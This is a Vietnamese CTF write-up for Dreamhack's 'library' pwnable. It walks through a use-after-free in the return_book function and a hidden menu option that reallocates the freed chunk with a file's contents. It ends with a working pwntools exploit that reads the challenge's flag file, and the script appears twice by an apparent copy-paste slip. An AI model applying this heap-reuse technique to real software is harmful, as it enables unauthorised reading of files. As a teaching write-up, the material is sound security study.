# pwn-library---Write-up-----Dreamhack
Hướng dẫn cách giải bài pwn library cho anh em mới chơi pwnable.

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 6/12/2025

## 1. Mục tiêu cần làm
1. Hiểu được lỗi Use After Free ( UAF )
2. Hiểu được cơ chế tái sử dụng bộ nhớ ( Heap Reuse ) của `malloc` và `free`
3. Tìm ra cách chiếm quyền điều khiển
4. Cooking bài nây

## 2. Cách thực thi
Bài này là một bài Heap nên các lớp bảo mật trên stack như `PIE` hay `Canary` không quan trọng. Quan trọng là cách chúng ta thao tác với các **Chunk** bộ nhớ như lào.

```C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

struct bookstruct{
	char bookname[0x20];
	char* contents;
};

__uint32_t booksize;
struct bookstruct listbook[0x50];
struct bookstruct secretbook;

void booklist(){
	printf("1. theori theory\n");
	printf("2. dreamhack theory\n");
	printf("3. einstein theory\n");
}

int borrow_book(){
	if(booksize >= 0x50){
		printf("[*] book storage is full!\n");
		return 1;
	}
	__uint32_t select = 0;
	printf("[*] Welcome to borrow book menu!\n");
	booklist();
	printf("[+] what book do you want to borrow? : ");
	scanf("%u", &select);
	if(select == 1){
		strcpy(listbook[booksize].bookname, "theori theory");
		listbook[booksize].contents = (char *)malloc(0x100);
		memset(listbook[booksize].contents, 0x0, 0x100);
		strcpy(listbook[booksize].contents, "theori is theori!");
	} else if(select == 2){
		strcpy(listbook[booksize].bookname, "dreamhack theory");
		listbook[booksize].contents = (char *)malloc(0x200);
		memset(listbook[booksize].contents, 0x0, 0x200);
		strcpy(listbook[booksize].contents, "dreamhack is dreamhack!");
	} else if(select == 3){
		strcpy(listbook[booksize].bookname, "einstein theory");
		listbook[booksize].contents = (char *)malloc(0x300);
		memset(listbook[booksize].contents, 0x0, 0x300);
		strcpy(listbook[booksize].contents, "einstein is einstein!");

	} else{
		printf("[*] no book...\n");
		return 1;
	}
	printf("book create complete!\n");
	booksize++;
	return 0;
}

int read_book(){
	__uint32_t select = 0;
	printf("[*] Welcome to read book menu!\n");
	if(!booksize){
		printf("[*] no book here..\n");
		return 0;
	}
	for(__uint32_t i = 0; i<booksize; i++){
		printf("%u : %s\n", i, listbook[i].bookname);
	}
	printf("[+] what book do you want to read? : ");
	scanf("%u", &select);
	if(select > booksize-1){
		printf("[*] no more book!\n");
		return 1;
	}
	printf("[*] book contents below [*]\n");
	printf("%s\n\n", listbook[select].contents);
	return 0;
}

int return_book(){
	printf("[*] Welcome to return book menu!\n");
	if(!booksize){
		printf("[*] no book here..\n");
		return 1;
	}
	if(!strcmp(listbook[booksize-1].bookname, "-----returned-----")){
		printf("[*] you alreay returns last book!\n");
		return 1;
	}
	free(listbook[booksize-1].contents);
	memset(listbook[booksize-1].bookname, 0, 0x20);
	strcpy(listbook[booksize-1].bookname, "-----returned-----");
	printf("[*] lastest book returned!\n");
	return 0;
}

int steal_book(){
	FILE *fp = 0;
	__uint32_t filesize = 0;
	__uint32_t pages = 0;
	char buf[0x100] = {0, };
	printf("[*] Welcome to steal book menu!\n");
	printf("[!] caution. it is illegal!\n");
	printf("[+] whatever, where is the book? : ");
	scanf("%144s", buf);
	fp = fopen(buf, "r");
	if(!fp){
		printf("[*] we can not find a book...\n");
		return 1;
	} else {
		fseek(fp, 0, SEEK_END);
    	filesize = ftell(fp);
    	fseek(fp, 0, SEEK_SET);
		printf("[*] how many pages?(MAX 400) : ");
		scanf("%u", &pages);
		if(pages > 0x190){
			printf("[*] it is heavy!!\n");
			return 1;
		}
		if(filesize > pages){
			filesize = pages;
		}
		secretbook.contents = (char *)malloc(pages);
		memset(secretbook.contents, 0x0, pages);
		__uint32_t result = fread(secretbook.contents, 1, filesize, fp);

		if(result != filesize){
			printf("[*] result : %u\n", result);
			printf("[*] it is locked..\n");
			return 1;
		}
		
		memset(secretbook.bookname, 0, 0x20);
		strcpy(secretbook.bookname, "STOLEN BOOK");
		printf("\n[*] (Siren rangs) (Siren rangs)\n");
		printf("[*] Oops.. cops take your book..\n");
		fclose(fp);
		return 0;
	}

}


void menuprint(){
	printf("1. borrow book\n");
	printf("2. read book\n");
	printf("3. return book\n");
	printf("4. exit library\n");
}
void main(){
	__uint32_t select = 0;
	printf("\n[*] Welcome to library!\n");
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	while(1){
		menuprint();
		printf("[+] Select menu : ");
		scanf("%u", &select);
		switch(select){
			case 1:
				borrow_book();
				break;
			case 2:
				read_book();
				break;
			case 3:
				return_book();
				break;
			case 4:
				printf("Good Bye!");
				exit(0);
				break;
			case 0x113:
				steal_book();
				break;
			default:
				printf("Wrong menu...\n");
				break;
		}
	}
}
```

Khi chạy bài này, chương trình sẽ in ra menu như sau

<img width="291" height="163" alt="image" src="https://github.com/user-attachments/assets/7f3911a2-7946-4d14-b963-98d62e441d59" />

1. Borrow book: Cấp phát bộ nhớ ( malloc ) để tạo sách mới.
2. Read book: Đọc nội dung sách tại index chỉ định.
3. Return book: Giải phóng bộ nhớ ( free ).
4. Exit: Thoát.

Khi các bạn đọc kĩ đoạn code này, các bạn sẽ thấy 1 vấn đề rất nghiêm trọng đã xảy ra.

```C
int return_book(){
    printf("[*] Welcome to return book menu!\n");
    // ... kiểm tra sách tồn tại ...
    
    // GIẢI PHÓNG BỘ NHỚ
    free(listbook[booksize-1].contents); 
    
    // XÓA TÊN SÁCH (NHƯNG KHÔNG XÓA CON TRỎ CONTENTS)
    memset(listbook[booksize-1].bookname, 0, 0x20);
    strcpy(listbook[booksize-1].bookname, "-----returned-----");
    
    printf("[*] lastest book returned!\n");
    return 0;
}
```

Như các bạn thấy, chương trình gọi free(...) để trả vùng nhớ contents cho hệ điều hành, nhưng nó quên mất một việc cực kỳ quan trọng : Gán con trỏ về `NULL`. Điều này tạo ra lỗi **Dangling Pointer** ( Con trỏ lơ lửng ). Tức là listbook[i].contents vẫn đang trỏ vào vùng nhớ vừa bị xóa. Nếu chúng ta có cách nào đó ghi dữ liệu vào vùng nhớ này, rồi dùng hàm `read_book` để đọc lại, ta sẽ thấy dữ liệu đó.

Tiếp theo đó thì ta thấy được có 1 menu ẩn trong main mà không hiện ra ở danh sách

```C
switch(select){
            case 1: borrow_book(); break;
            case 2: read_book(); break;
            case 3: return_book(); break;
            case 4: ... exit ...;
            case 0x113: // 275 trong hệ thập phân
                steal_book();
                break;
            // ...
        }
```

Khi chúng ta nhập 275 vào menu nó sẽ nhảy vào 1 hàm ẩn đó là hàm `steal_book` ( aka Nam Định ).

```C
int steal_book(){
	FILE *fp = 0;
	__uint32_t filesize = 0;
	__uint32_t pages = 0;
	char buf[0x100] = {0, };
	printf("[*] Welcome to steal book menu!\n");
	printf("[!] caution. it is illegal!\n");
	printf("[+] whatever, where is the book? : ");
	scanf("%144s", buf);
	fp = fopen(buf, "r");
	if(!fp){
		printf("[*] we can not find a book...\n");
		return 1;
	} else {
		fseek(fp, 0, SEEK_END);
    	filesize = ftell(fp);
    	fseek(fp, 0, SEEK_SET);
		printf("[*] how many pages?(MAX 400) : ");
		scanf("%u", &pages);
		if(pages > 0x190){
			printf("[*] it is heavy!!\n");
			return 1;
		}
		if(filesize > pages){
			filesize = pages;
		}
		secretbook.contents = (char *)malloc(pages);
		memset(secretbook.contents, 0x0, pages);
		__uint32_t result = fread(secretbook.contents, 1, filesize, fp);

		if(result != filesize){
			printf("[*] result : %u\n", result);
			printf("[*] it is locked..\n");
			return 1;
		}
		
		memset(secretbook.bookname, 0, 0x20);
		strcpy(secretbook.bookname, "STOLEN BOOK");
		printf("\n[*] (Siren rangs) (Siren rangs)\n");
		printf("[*] Oops.. cops take your book..\n");
		fclose(fp);
		return 0;
	}

}
```

Hàm `steal_book` này có tác dụng gì ?

1. Nó hỏi tên file cần đọc.
2. Nó hỏi số trang (kích thước).
3. Nó malloc một vùng nhớ mới đúng bằng kích thước đó.
4. Nó đọc nội dung file và ghi vào vùng nhớ này.

Đây chính là chìa khóa. Cơ chế Heap của Linux ( glibc ) hoạt động theo kiểu `tiết kiệm` : Nếu bạn vừa free một vùng nhớ size X, và ngay sau đó malloc lại một vùng nhớ size X, hệ điều hành sẽ trả lại đúng địa chỉ cũ.

Vậy quy trình để làm bài này là tạo 1 vùng nhớ Chunk A, sau đó `free` Chunk A này nhưng con trỏ vẫn trỏ vào A, nhập dúng size A và `malloc` sẽ cấp lại Chunk A. Ghi địa chỉ flag vào Chunk A. Vì con trỏ vẫn đang trỏ vào A nên khi chúng ta `read_book` thì nó sẽ đọc địa chỉ flag trong A luôn.

Vậy là xong 1 bài Heap đơn giản, hãy cho mình 1 star để có động lực ra thêm write up mới nha 🐧.


```Python
from pwn import *

# Bật debug để xem chi tiết
context.log_level = 'debug'

# --- CẤU HÌNH ---
# p = process('./library') # Chạy local
# Thay HOST và PORT của bạn vào đây
p = remote('host8.dreamhack.games', 13196) 

# --- BẮT ĐẦU KHAI THÁC ---

log.info("=== BƯỚC 1: Mượn sách (Alloc 0x100) ===")
# Chọn menu 1: Borrow
p.sendlineafter(b'[+] Select menu : ', b'1')
# Chọn sách 1: size 0x100
p.sendlineafter(b'[+] what book do you want to borrow? : ', b'1')

log.info("=== BƯỚC 2: Trả sách (Free -> UAF) ===")
# Chọn menu 3: Return
# Vùng nhớ bị free, nhưng pointer ở index 0 vẫn còn
p.sendlineafter(b'[+] Select menu : ', b'3')

log.info("=== BƯỚC 3: Trộm sách (Re-alloc & Ghi Flag) ===")
# Chọn menu ẩn: 275 (0x113)
p.sendlineafter(b'[+] Select menu : ', b'275')

# Gửi đường dẫn file flag (Lưu ý đường dẫn của DreamHack)
p.sendlineafter(b'[+] whatever, where is the book? : ', b'/home/pwnlibrary/flag.txt')

# Nhập số trang 256 để tái sử dụng đúng chunk vừa free
p.sendlineafter(b'[*] how many pages?(MAX 400) : ', b'256')

log.info("=== BƯỚC 4: Đọc sách (Leak Flag) ===")
# Chọn menu 2: Read
p.sendlineafter(b'[+] Select menu : ', b'2')

# Đọc sách số 0 -> In ra nội dung vùng nhớ bị trỏ tới (Flag)
p.sendlineafter(b'[+] what book do you want to read? : ', b'0')

p.interactive()from pwn import *

# Bật debug để xem chi tiết
context.log_level = 'debug'

# --- CẤU HÌNH ---
# p = process('./library') # Chạy local
# Thay HOST và PORT của bạn vào đây
p = remote('host8.dreamhack.games', 13196) 

# --- BẮT ĐẦU KHAI THÁC ---

log.info("=== BƯỚC 1: Mượn sách (Alloc 0x100) ===")
# Chọn menu 1: Borrow
p.sendlineafter(b'[+] Select menu : ', b'1')
# Chọn sách 1: size 0x100
p.sendlineafter(b'[+] what book do you want to borrow? : ', b'1')

log.info("=== BƯỚC 2: Trả sách (Free -> UAF) ===")
# Chọn menu 3: Return
# Vùng nhớ bị free, nhưng pointer ở index 0 vẫn còn
p.sendlineafter(b'[+] Select menu : ', b'3')

log.info("=== BƯỚC 3: Trộm sách (Re-alloc & Ghi Flag) ===")
# Chọn menu ẩn: 275 (0x113)
p.sendlineafter(b'[+] Select menu : ', b'275')

# Gửi đường dẫn file flag (Lưu ý đường dẫn của DreamHack)
p.sendlineafter(b'[+] whatever, where is the book? : ', b'/home/pwnlibrary/flag.txt')

# Nhập số trang 256 để tái sử dụng đúng chunk vừa free
p.sendlineafter(b'[*] how many pages?(MAX 400) : ', b'256')

log.info("=== BƯỚC 4: Đọc sách (Leak Flag) ===")
# Chọn menu 2: Read
p.sendlineafter(b'[+] Select menu : ', b'2')

# Đọc sách số 0 -> In ra nội dung vùng nhớ bị trỏ tới (Flag)
p.sendlineafter(b'[+] what book do you want to read? : ', b'0')

p.interactive()
```
